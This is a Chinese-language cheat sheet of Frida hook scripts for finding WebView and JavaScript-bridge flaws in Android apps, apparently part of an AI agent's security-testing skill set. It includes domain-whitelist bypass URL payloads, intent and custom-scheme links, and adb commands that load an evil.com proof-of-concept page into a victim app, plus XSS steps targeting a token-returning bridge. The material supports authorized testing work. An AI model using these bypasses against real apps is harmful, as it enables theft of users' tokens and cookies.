# Frida 动态分析即用脚本（APK/JSB 挖掘）

> 现成 hook，按需复制。`frida -U -f <pkg> -l xxx.js --no-pause` 或 attach。
> 只读观察型 hook 优先；会改变状态的 hook 已标注。

## 1. loadUrl 全量记录 + 调用栈（Phase 0 起手式）

```js
Java.perform(function () {
  var WebView = Java.use("android.webkit.WebView");
  var Log = Java.use("android.util.Log");
  var Exception = Java.use("java.lang.Exception");

  WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
    console.log("[loadUrl] " + url);
    console.log(Log.getStackTraceString(Exception.$new()));
    return this.loadUrl(url);
  };
  // loadDataWithBaseURL 同样要挂：file:// 与 base URL 混淆的主要入口
  WebView.loadDataWithBaseURL.overload(
    'java.lang.String', 'java.lang.String', 'java.lang.String',
    'java.lang.String', 'java.lang.String'
  ).implementation = function (baseUrl, data, mimeType, encoding, historyUrl) {
    console.log("[loadDataWithBaseURL] base=" + baseUrl + " history=" + historyUrl);
    return this.loadDataWithBaseURL(baseUrl, data, mimeType, encoding, historyUrl);
  };
});
```

## 2. 导航拦截与最终 URL（看防御校验挂在哪一层）

```js
Java.perform(function () {
  var WebViewClient = Java.use("android.webkit.WebViewClient");
  // shouldOverrideUrlLoading 是 Layer 1/2 校验最常见挂载点
  WebViewClient.shouldOverrideUrlLoading.overload(
    'android.webkit.WebView', 'java.lang.String'
  ).implementation = function (view, url) {
    console.log("[shouldOverrideUrlLoading] " + url + " -> " +
      (this.shouldOverrideUrlLoading(view, url) ? "BLOCKED" : "PASSED"));
    return this.shouldOverrideUrlLoading(view, url);
  };
  // WebView2.x 新签名（WebResourceRequest）
  try {
    WebViewClient.shouldOverrideUrlLoading.overload(
      'android.webkit.WebView', 'android.webkit.WebResourceRequest'
    ).implementation = function (view, req) {
      console.log("[shouldOverrideUrlLoading/v2] " + req.getUrl());
      return this.shouldOverrideUrlLoading(view, req);
    };
  } catch (e) {}
});
```

## 3. JSB 注入与方法表 dump（Phase 2）

```js
Java.perform(function () {
  var WebView = Java.use("android.webkit.WebView");
  WebView.addJavascriptInterface.implementation = function (obj, name) {
    console.log("[addJavascriptInterface] name=" + name + " class=" + obj.$className);
    // dump @JavascriptInterface 方法表
    try {
      var klass = Java.use(obj.$className);
      var methods = klass.class.getDeclaredMethods();
      for (var i = 0; i < methods.length; i++) {
        var m = methods[i];
        var anns = m.getAnnotations();
        for (var j = 0; j < anns.length; j++) {
          if (anns[j].toString().indexOf("JavascriptInterface") !== -1) {
            console.log("    JSB method: " + m.getName() + " " + m.toGenericString());
          }
        }
      }
    } catch (e) { console.log("    dump fail: " + e); }
    return this.addJavascriptInterface(obj, name);
  };
});
```

运行中目标 App 已启动后再挂（注入发生在 Activity onCreate）——用 attach 模式或 spawn 后延时。

## 4. 域名白名单函数 trace（Phase 3 定位校验实现）

先用静态搜索锁定类名（如 `com.x.util.DomainUtils.checkDomain`），再挂：

```js
Java.perform(function () {
  var DomainUtils = Java.use("com.x.util.DomainUtils"); // 换成目标实现类
  DomainUtils.checkDomain.implementation = function (url) {
    var ret = this.checkDomain(url);
    console.log("[checkDomain] " + url + " => " + ret); // ret=false 意味着被拦截
    return ret;
  };
});
```

爆破变体测试（配合 Layer 2 手法表）：

```js
var payloads = [
  "https://target.com.evil.com/",   // 2.1 contains
  "https://eviltarget.com/",          // 2.2 endsWith 缺点
  "https://target.com@evil.com/",     // 2.4 userinfo
  "https://target.com\\@evil.com/",   // 2.6 反斜杠
  "https://evil.com/target.com%2f",   // 2.5 编码差分
  "https://target.com./",             // 2.8 trailing dot
  "file:///sdcard/poc.html",          // 2.10 scheme 逃逸
];
Java.perform(function () {
  var DomainUtils = Java.use("com.x.util.DomainUtils");
  payloads.forEach(function (p) {
    try { console.log(p + " => " + DomainUtils.checkDomain(p)); }
    catch (e) { console.log(p + " => EXC " + e); }
  });
});
```

## 5. JSB 调用监听（确认特权接口被触达）

```js
Java.perform(function () {
  // 挂 addJavascriptInterface dump 出来的具体类；示例挂 getToken
  var Bridge = Java.use("com.x.bridge.AppBridge");
  Bridge.getToken.implementation = function () {
    console.log("[JSB] getToken called from web; stack:");
    console.log(Java.use("android.util.Log").getStackTraceString(
      Java.use("java.lang.Exception").$new()));
    return this.getToken();
  };
});
```

## 6. Cookie 面（Phase 4 影响验证）

```js
Java.perform(function () {
  var CookieManager = Java.use("android.webkit.CookieManager");
  CookieManager.getCookie.overload('java.lang.String').implementation = function (url) {
    var c = this.getCookie(url);
    console.log("[getCookie] " + url + " => " + c);
    return c;
  };
});
```

## 7. 入口验证：A 浏览器一次点击 / B App 功能内 XSS

`am start` 只能做开发期定位，**不能**作为入口验证或 PoC 证据。合格入口只有 A/B 两类（SKILL.md Gate 0）。

### A 类：浏览器一次点击

宿主机起一个攻击页（任意静态服务器），页面放：

```html
<a href="intent://web?url=https%3A%2F%2Fevil.com%2Fpoc.html#Intent;scheme=victimscheme;package=com.victim.app;end">打开</a>
```

或自定义 scheme（目标需声明 `CATEGORY_BROWSABLE`）：

```html
<a href="victimscheme://web?url=https://evil.com/poc.html">打开</a>
```

验证步骤：

1. 手机浏览器打开攻击页 URL（地址栏可见 `http(s)://attacker/...`）。
2. 手指点击链接；系统"打开应用"确认框属于同一次点击。
3. 用脚本 1 的 `[loadUrl]` 日志 / logcat 确认攻击 URL 进入目标容器，且包名为目标 App。
4. 录屏必须包含地址栏与浏览器→App 的切换。

### B 类：App 功能内 XSS

1. 攻击者账号在可写字段投放 payload（评论/昵称/私信/群公告等），或构造反射 URL；
2. 受害者账号打开对应功能页/链接，确认 payload 在 App 内 WebView 执行；
3. 用脚本 5 或 `chrome://inspect` 确认执行后触达 JSB（如 `getToken` 回包）；
4. 录屏分两段：投放（攻击者视角）+ 执行（受害者视角）。

开发期仍可用下面命令快速定位组件，但结论必须回到 A/B 真实路径：

```bash
adb shell am start -n com.victim.app/.web.H5Activity \
  --es url "https://evil.com/poc.html" -W
adb shell am start -a android.intent.action.VIEW -d "victimscheme://web?url=https://evil.com/"
```

`-W` 输出 `Status: ok` 只说明组件可被拉起，不说明浏览器可达。

## 注意

- 涉及状态改变的 hook（如主动调 JSB 方法）仅在授权下做，测试机/模拟器上执行。
- 加固 App 先脱壳（reverse-engineering-anything skill）；hook 失败常见原因是类被加固壳 ClassLoader 加载，需 `Java.classFactory.loader` 切换。
